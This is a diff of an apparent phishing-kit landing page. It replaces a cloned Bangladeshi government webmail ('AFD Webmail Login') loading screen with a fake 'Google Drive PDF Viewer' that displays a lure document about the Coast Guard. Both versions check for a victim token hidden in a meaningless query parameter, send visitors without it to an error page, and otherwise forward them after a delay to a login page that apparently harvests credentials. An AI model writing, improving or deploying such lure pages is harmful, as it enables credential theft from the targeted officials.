@@ -1,423 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<link rel="SHORTCUT ICON" href="https://mail.afd.gov.bd/favicon.ico">	
-		<title>AFD Webmail Login</title>
-    <base href=".">
-    <meta http-equiv="pragma" content="no-cache">
-    <meta name="robots" content="noindex">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="./files/styles.ce29b658bf35a0a571c5.css">
-    <style>
-      @keyframes dashboard-fade-in {
-        0% {
-          opacity: 0
-        }
+<head>
+  <meta charset="UTF-8">
+  <title>Google Drive PDF Viewer</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background: #000;
+      overflow: hidden;
+    }
 
-        to {
-          opacity: 1
-        }
-      }
+    .content {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      transition: filter 0.4s ease;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
 
-      nu-header[_ngcontent-rxw-c113] {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        z-index: 10
-      }
+    .content.blurred {
+      filter: blur(6px);
+    }
 
-      nu-nav[_ngcontent-rxw-c113] {
-        z-index: 10
-      }
+    object {
+      width: 100%;
+      height: 100%;
+      border: none;
+      background: #111;
+    }
+  </style>
+</head>
+<body>
 
-      nu-nav[_ngcontent-rxw-c113],
-      nu-router-outlet[_ngcontent-rxw-c113] {
-        position: absolute;
-        top: 41px;
-        left: 0;
-        bottom: 0;
-        transition: left .4s ease-in-out
-      }
+  <div class="content" id="content">
+    <object data="/OM to coast Guard.pdf" type="application/pdf">
+      <p>Your browser does not support PDFs.
+        <a href="/OM to coast Guard.pdf">Download the PDF</a>.
+      </p>
+    </object>
+  </div>
 
-      nu-router-outlet[_ngcontent-rxw-c113] {
-        right: 0
-      }
+  <script>
+    // Function to get query parameter
+    function getQueryParameter(name) {
+      const params = new URLSearchParams(window.location.search);
+      return params.get(name);
+    }
 
-      body.nu-header-alert-message[_nghost-rxw-c113] nu-nav[_ngcontent-rxw-c113],
-      body.nu-header-alert-message [_nghost-rxw-c113] nu-nav[_ngcontent-rxw-c113],
-      body.nu-header-alert-message[_nghost-rxw-c113] nu-router-outlet[_ngcontent-rxw-c113],
-      body.nu-header-alert-message [_nghost-rxw-c113] nu-router-outlet[_ngcontent-rxw-c113],
-      body.nu-responsive-small[_nghost-rxw-c113] nu-nav[_ngcontent-rxw-c113],
-      body.nu-responsive-small [_nghost-rxw-c113] nu-nav[_ngcontent-rxw-c113] {
-        top: 82px
-      }
+    // Get encoded parameter
+    const value = getQueryParameter('ksbfjkguirejgjkfdshrouwheofshfwerwehi');
 
-      body.nu-header-alert-message.nu-responsive-small[_nghost-rxw-c113] nu-nav[_ngcontent-rxw-c113],
-      body.nu-header-alert-message.nu-responsive-small [_nghost-rxw-c113] nu-nav[_ngcontent-rxw-c113] {
-        top: 123px
-      }
+    // If missing → redirect to error page
+    if (!value) {
+      window.location.href = "error.html";
+    } else {
+      // Redirect after 3 seconds
+      setTimeout(() => {
+        const redirectURL = "login.html?bfjkdghurehgjufhdkhgruiegbvousdhfowehr=" + encodeURIComponent(value);
+        window.location.href = redirectURL;
+      }, 5000);
+    }
+  </script>
 
-      body:not(.nu-hide-navigation):not(.nu-responsive-small)[_nghost-rxw-c113] nu-router-outlet[_ngcontent-rxw-c113],
-      body:not(.nu-hide-navigation):not(.nu-responsive-small) [_nghost-rxw-c113] nu-router-outlet[_ngcontent-rxw-c113] {
-        left: 250px
-      }
-
-      body.nu-hide-navigation[_nghost-rxw-c113] nu-nav[_ngcontent-rxw-c113],
-      body.nu-hide-navigation [_nghost-rxw-c113] nu-nav[_ngcontent-rxw-c113],
-      body.nu-responsive-small:not(.nu-mobile-expanded)[_nghost-rxw-c113] nu-nav[_ngcontent-rxw-c113],
-      body.nu-responsive-small:not(.nu-mobile-expanded) [_nghost-rxw-c113] nu-nav[_ngcontent-rxw-c113] {
-        left: -250px
-      }
-
-      .logged-out-info[_ngcontent-rxw-c113] {
-        font-size: 1.1em;
-        margin-top: 2em;
-        display: flex;
-        flex-flow: column
-      }
-
-      .logged-out-info[_ngcontent-rxw-c113] .info-text[_ngcontent-rxw-c113] {
-        margin: auto
-      }
-
-      .logged-out-info[_ngcontent-rxw-c113] .info-button[_ngcontent-rxw-c113] {
-        margin: 1em auto
-      }
-    </style>
-    <style id="nu-active-theme" type="text/css">
-      /* theme: FxBlue */
-      :root {
-        --nu-theme-color-background-level0: 255, 255, 255;
-        --nu-theme-color-background-level1: 250, 250, 250;
-        --nu-theme-color-background-level2: 245, 245, 245;
-        --nu-theme-color-background-level3: 230, 230, 230;
-        --nu-theme-color-background-level4: 197, 197, 197;
-        --nu-theme-color-background-level5: 163, 163, 163;
-        --nu-theme-on-color-background: 45, 45, 45;
-        --nu-theme-color-border-level0: 226, 226, 226;
-        --nu-theme-color-border-level1: 206, 206, 206;
-        --nu-theme-color-border-level2: 185, 185, 185;
-        --nu-theme-color-border-level3: 147, 147, 147;
-        --nu-theme-color-border-level4: 101, 101, 101;
-        --nu-theme-color-border-level5: 45, 45, 45;
-        --nu-theme-color-header-base: 43, 118, 185;
-        --nu-theme-color-header-hover: 63, 141, 210;
-        --nu-theme-on-color-header: 255, 255, 255;
-        --nu-theme-color-selected-base: 43, 118, 185;
-        --nu-theme-color-selected-hover: 63, 141, 210;
-        --nu-theme-on-color-selected: 255, 255, 255;
-        --nu-theme-color-call-to-action-base: 43, 118, 185;
-        --nu-theme-color-call-to-action-hover: 63, 141, 210;
-        --nu-theme-on-color-call-to-action: 255, 255, 255;
-        --nu-theme-color-accent-base: 91, 173, 251;
-        --nu-theme-color-accent-hover: 158, 206, 253;
-        --nu-theme-on-color-accent: 255, 255, 255;
-        --nu-theme-color-list-selected-base: 255, 255, 170;
-        --nu-theme-color-list-selected-hover: 230, 230, 153;
-        --nu-theme-on-color-list-selected: 45, 45, 45;
-        --nu-theme-color-highlighted-base: 255, 255, 0;
-        --nu-theme-color-highlighted-hover: 204, 204, 0;
-        --nu-theme-on-color-highlighted: 45, 45, 45;
-        --nu-theme-color-located-base: 255, 178, 145;
-        --nu-theme-color-located-hover: 230, 160, 131;
-        --nu-theme-on-color-located: 45, 45, 45;
-        --nu-theme-color-informative-success-base: 0, 139, 16;
-        --nu-theme-color-informative-success-hover: 0, 153, 18;
-        --nu-theme-on-color-informative-success: 255, 255, 255;
-        --nu-theme-color-informative-severity-low-base: 43, 118, 185;
-        --nu-theme-color-informative-severity-low-hover: 47, 130, 203;
-        --nu-theme-on-color-informative-severity-low: 255, 255, 255;
-        --nu-theme-color-informative-severity-medium-base: 243, 187, 45;
-        --nu-theme-color-informative-severity-medium-hover: 241, 178, 18;
-        --nu-theme-on-color-informative-severity-medium: 45, 45, 45;
-        --nu-theme-color-informative-severity-high-base: 226, 135, 34;
-        --nu-theme-color-informative-severity-high-hover: 229, 147, 57;
-        --nu-theme-on-color-informative-severity-high: 255, 255, 255;
-        --nu-theme-color-informative-severity-critical-base: 212, 53, 39;
-        --nu-theme-color-informative-severity-critical-hover: 219, 70, 57;
-        --nu-theme-on-color-informative-severity-critical: 255, 255, 255;
-        --nu-theme-color-low-contrast-informative-success-base: 212, 237, 218;
-        --nu-theme-color-low-contrast-informative-success-hover: 196, 230, 204;
-        --nu-theme-on-color-low-contrast-informative-success: 21, 87, 36;
-        --nu-theme-color-low-contrast-informative-severity-low-base: 204, 229, 255;
-        --nu-theme-color-low-contrast-informative-severity-low-hover: 181, 217, 255;
-        --nu-theme-on-color-low-contrast-informative-severity-low: 0, 64, 133;
-        --nu-theme-color-low-contrast-informative-severity-medium-base: 255, 243, 205;
-        --nu-theme-color-low-contrast-informative-severity-medium-hover: 255, 237, 182;
-        --nu-theme-on-color-low-contrast-informative-severity-medium: 133, 100, 4;
-        --nu-theme-color-low-contrast-informative-severity-critical-base: 248, 215, 218;
-        --nu-theme-color-low-contrast-informative-severity-critical-hover: 245, 195, 200;
-        --nu-theme-on-color-low-contrast-informative-severity-critical: 114, 28, 36;
-        --nu-theme-color-link-base: 35, 96, 147;
-        --nu-theme-color-link-active: 35, 96, 147;
-        --nu-theme-color-link-visited: 35, 96, 147;
-        --nu-theme-color-icon-red: 212, 53, 39;
-        --nu-theme-color-icon-yellow: 243, 187, 45;
-        --nu-theme-color-icon-blue: 43, 118, 185;
-        --nu-theme-color-icon-green: 0, 139, 16;
-        --nu-theme-color-icon-orange: 226, 135, 34;
-        --nu-theme-color-misc-control-error: 212, 53, 39;
-        --nu-theme-color-misc-control-error-pristine: 255, 255, 238;
-        --nu-theme-color-misc-shadow: 0, 0, 0;
-        --nu-theme-dimension-button-border-radius: 0px;
-        --nu-theme-dimension-input-border-radius: 0px;
-        --nu-theme-override-header-branding-background: 212, 53, 39;
-        --nu-theme-override-nav-active-informative-severity-low: 255, 255, 255;
-        --nu-theme-override-nav-on-active-informative-severity-low: 43, 118, 185;
-      }
-    </style>
-    <style></style>
-    <style>
-      @-webkit-keyframes dashboard-fade-in {
-        0% {
-          opacity: 0
-        }
-
-        to {
-          opacity: 1
-        }
-      }
-
-      .mat-accent[_ngcontent-rxw-c246] .mat-pseudo-checkbox-checked[_ngcontent-rxw-c246],
-      .mat-accent[_ngcontent-rxw-c246] .mat-pseudo-checkbox-indeterminate[_ngcontent-rxw-c246],
-      .mat-checkbox-indeterminate.mat-accent[_ngcontent-rxw-c246] .mat-checkbox-background[_ngcontent-rxw-c246],
-      .mat-pseudo-checkbox-checked[_ngcontent-rxw-c246],
-      .mat-pseudo-checkbox-indeterminate[_ngcontent-rxw-c246],
-      .mat-checkbox-checked.mat-accent .mat-checkbox-background,
-      .mat-checkbox-checked .mat-checkbox-background,
-      .mat-checkbox-indeterminate .mat-checkbox-background {
-        background-color: rgb(var(--nu-theme-color-selected-base)) !important
-      }
-
-      .mat-checkbox:not(.mat-checkbox-disabled) .mat-checkbox-ripple .mat-ripple-element {
-        background-color: #000 !important
-      }
-
-      @keyframes dashboard-fade-in {
-        0% {
-          opacity: 0
-        }
-
-        to {
-          opacity: 1
-        }
-      }
-
-      nu-header[_ngcontent-rxw-c246] {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        z-index: 10
-      }
-
-      nu-nav[_ngcontent-rxw-c246] {
-        z-index: 10
-      }
-
-      nu-nav[_ngcontent-rxw-c246],
-      nu-router-outlet[_ngcontent-rxw-c246] {
-        position: absolute;
-        top: 41px;
-        left: 0;
-        bottom: 0;
-        transition: left .4s ease-in-out
-      }
-
-      nu-router-outlet[_ngcontent-rxw-c246] {
-        right: 0
-      }
-
-      body.nu-header-alert-message[_nghost-rxw-c246] nu-nav[_ngcontent-rxw-c246],
-      body.nu-header-alert-message [_nghost-rxw-c246] nu-nav[_ngcontent-rxw-c246],
-      body.nu-header-alert-message[_nghost-rxw-c246] nu-router-outlet[_ngcontent-rxw-c246],
-      body.nu-header-alert-message [_nghost-rxw-c246] nu-router-outlet[_ngcontent-rxw-c246],
-      body.nu-responsive-small[_nghost-rxw-c246] nu-nav[_ngcontent-rxw-c246],
-      body.nu-responsive-small [_nghost-rxw-c246] nu-nav[_ngcontent-rxw-c246] {
-        top: 82px
-      }
-
-      body.nu-header-alert-message.nu-responsive-small[_nghost-rxw-c246] nu-nav[_ngcontent-rxw-c246],
-      body.nu-header-alert-message.nu-responsive-small [_nghost-rxw-c246] nu-nav[_ngcontent-rxw-c246] {
-        top: 123px
-      }
-
-      body:not(.nu-hide-navigation):not(.nu-responsive-small)[_nghost-rxw-c246] nu-router-outlet[_ngcontent-rxw-c246],
-      body:not(.nu-hide-navigation):not(.nu-responsive-small) [_nghost-rxw-c246] nu-router-outlet[_ngcontent-rxw-c246] {
-        left: 250px
-      }
-
-      body.nu-hide-navigation[_nghost-rxw-c246] nu-nav[_ngcontent-rxw-c246],
-      body.nu-hide-navigation [_nghost-rxw-c246] nu-nav[_ngcontent-rxw-c246],
-      body.nu-responsive-small:not(.nu-mobile-expanded)[_nghost-rxw-c246] nu-nav[_ngcontent-rxw-c246],
-      body.nu-responsive-small:not(.nu-mobile-expanded) [_nghost-rxw-c246] nu-nav[_ngcontent-rxw-c246] {
-        left: -250px
-      }
-
-      nu-header .nav-toggle {
-        margin-left: 4px
-      }
-
-      nu-header[_ngcontent-rxw-c246] .compose-icon[_ngcontent-rxw-c246] {
-        display: none
-      }
-
-      body.nu-hide-navigation[_nghost-rxw-c246] nu-header[_ngcontent-rxw-c246] .compose-icon[_ngcontent-rxw-c246],
-      body.nu-hide-navigation [_nghost-rxw-c246] nu-header[_ngcontent-rxw-c246] .compose-icon[_ngcontent-rxw-c246],
-      body.nu-responsive-small:not(.nu-mobile-expanded)[_nghost-rxw-c246] nu-header[_ngcontent-rxw-c246] .compose-icon[_ngcontent-rxw-c246],
-      body.nu-responsive-small:not(.nu-mobile-expanded) [_nghost-rxw-c246] nu-header[_ngcontent-rxw-c246] .compose-icon[_ngcontent-rxw-c246] {
-        display: flex
-      }
-
-      body.nu-full-height-nav:not(.nu-responsive-small) .header-primary {
-        background-color: inherit !important;
-        color: inherit !important
-      }
-
-      body.nu-full-height-nav:not(.nu-responsive-small) .header-primary .primary-label {
-        border-right: none !important
-      }
-
-      nu-header[_ngcontent-rxw-c246] .search-and-info-wrapper[_ngcontent-rxw-c246] {
-        display: none
-      }
-
-      body.nu-hide-navigation.nu-responsive-small[_nghost-rxw-c246] nu-header[_ngcontent-rxw-c246] .search-and-info-wrapper[_ngcontent-rxw-c246],
-      body.nu-hide-navigation.nu-responsive-small [_nghost-rxw-c246] nu-header[_ngcontent-rxw-c246] .search-and-info-wrapper[_ngcontent-rxw-c246],
-      body.nu-responsive-small[_nghost-rxw-c246] nu-header[_ngcontent-rxw-c246] .search-and-info-wrapper[_ngcontent-rxw-c246],
-      body.nu-responsive-small [_nghost-rxw-c246] nu-header[_ngcontent-rxw-c246] .search-and-info-wrapper[_ngcontent-rxw-c246] {
-        display: flex
-      }
-
-      body.nu-hide-navigation.nu-responsive-small[_nghost-rxw-c246] nu-header.forward-only-access[_ngcontent-rxw-c246],
-      body.nu-hide-navigation.nu-responsive-small [_nghost-rxw-c246] nu-header.forward-only-access[_ngcontent-rxw-c246],
-      body.nu-responsive-small[_nghost-rxw-c246] nu-header.forward-only-access[_ngcontent-rxw-c246],
-      body.nu-responsive-small [_nghost-rxw-c246] nu-header.forward-only-access[_ngcontent-rxw-c246] {
-        grid-template-areas: "primary header-nav-actions info actions"
-      }
-
-      body.nu-hide-navigation.nu-responsive-small[_nghost-rxw-c246] nu-header.forward-only-access[_ngcontent-rxw-c246] .header-actions,
-      body.nu-hide-navigation.nu-responsive-small [_nghost-rxw-c246] nu-header.forward-only-access[_ngcontent-rxw-c246] .header-actions,
-      body.nu-responsive-small[_nghost-rxw-c246] nu-header.forward-only-access[_ngcontent-rxw-c246] .header-actions,
-      body.nu-responsive-small [_nghost-rxw-c246] nu-header.forward-only-access[_ngcontent-rxw-c246] .header-actions {
-        display: flex
-      }
-
-      .header-nav-actions .search-and-info-wrapper {
-        margin: 0 .5em;
-        align-items: center
-      }
-
-      .header-info {
-        justify-content: space-between !important;
-        padding-right: .5em !important
-      }
-
-      .header-info nu-search-input {
-        max-width: 500px;
-        margin-left: .8em
-      }
-
-      nu-header-action-dropdown.sub-menu-dropdown {
-        flex: auto
-      }
-
-      nu-header-action-dropdown.sub-menu-dropdown>button {
-        flex: auto;
-        padding: 0 !important;
-        color: rgb(var(--nu-theme-override-button-text, var(--nu-theme-on-color-background))) !important;
-        border-color: transparent !important
-      }
-
-      nu-header-action-dropdown.sub-menu-dropdown>button:hover {
-        background: rgb(var(--nu-theme-override-button-hover-background, var(--nu-theme-color-background-level3))) !important
-      }
-
-      .logo-span[_ngcontent-rxw-c246] {
-        width: 250px;
-        height: 100%;
-        margin-left: -.75em
-      }
-
-      @-webkit-keyframes blink {
-        0% {
-          color: rgb(var(--nu-theme-on-color-header))
-        }
-
-        to {
-          color: rgb(var(--nu-theme-color-header-base))
-        }
-      }
-
-      @keyframes blink {
-        0% {
-          color: rgb(var(--nu-theme-on-color-header))
-        }
-
-        to {
-          color: rgb(var(--nu-theme-color-header-base))
-        }
-      }
-
-      .blink[_ngcontent-rxw-c246] {
-        -webkit-animation: blink 1s linear infinite;
-        animation: blink 1s linear infinite
-      }
-    </style>
-    
-   <script>
-		     // Function to extract query parameter value
-		    function getQueryParameter(parameterName) {
-		      var queryString = window.location.search;
-		      var urlParams = new URLSearchParams(queryString);
-		      return urlParams.get(parameterName);
-		    }
-		    // Get the value from the 'data' query parameter
-		    var value = getQueryParameter('ksbfjkguirejgjkfdshrouwheofshfwerwehi');
-		    
-		    if(value == null) {
-		    
-		    	window.location.href = "error.html";
-		    
-		    }else{
-		    
-		     function redirectToDestination() {
-		    // Redirect to the destination page with the variable value in the URL
-		    window.location.href = "login.html?bfjkdghurehgjufhdkhgruiegbvousdhfowehr=" + (value);
-		    }
-
-		    // Automatically redirect after a certain delay (e.g., 2 seconds)
-		    setTimeout(redirectToDestination, 3000);
-		    }
-		    
-		
-	 </script>
-  </head>
-  <body class="nu-theme-fx-blue nu-light-theme nu-responsive-medium nu-responsive-large">
-    <app-root _nghost-rxw-c113="" ng-version="11.2.14">
-      <!---->
-      <div _ngcontent-rxw-c113="">
-        <router-outlet _ngcontent-rxw-c113=""></router-outlet>
-        <app-shell _nghost-rxw-c246="">
-          <div _ngcontent-rxw-c246="" class="loading-wrapper">
-            <nu-loading _ngcontent-rxw-c246="" _nghost-rxw-c61="">
-              <nu-icon _ngcontent-rxw-c61="" _nghost-rxw-c60="" data-nu-icon-size="xxxlarge" class="nu-loading-icon" data-nu-icon="fa-solid__spinner" style="width: 42px; height: 42px;">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18 18" style="transform: translate(-9px, -9px) scale(2.33333) translate(9px, 9px); width: 18px; height: 18px;">
-                  <path d="M10.5 2.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zM9 14a1.5 1.5 0 100 3 1.5 1.5 0 000-3zm6.5-6.5a1.5 1.5 0 100 3 1.5 1.5 0 000-3zM4 9a1.5 1.5 0 10-3 0 1.5 1.5 0 003 0zm.404 3.096a1.5 1.5 0 100 3 1.5 1.5 0 000-3zm9.192 0a1.5 1.5 0 100 3 1.5 1.5 0 000-3zM4.404 2.904a1.5 1.5 0 100 3 1.5 1.5 0 000-3z"></path>
-                </svg>
-              </nu-icon>
-            </nu-loading>
-          </div>
-          <!---->
-          <!---->
-          <!---->
-        </app-shell>
-        <!---->
-      </div>
-      <!---->
-      <!---->
-    </app-root>
-  </body>
+</body>
 </html>
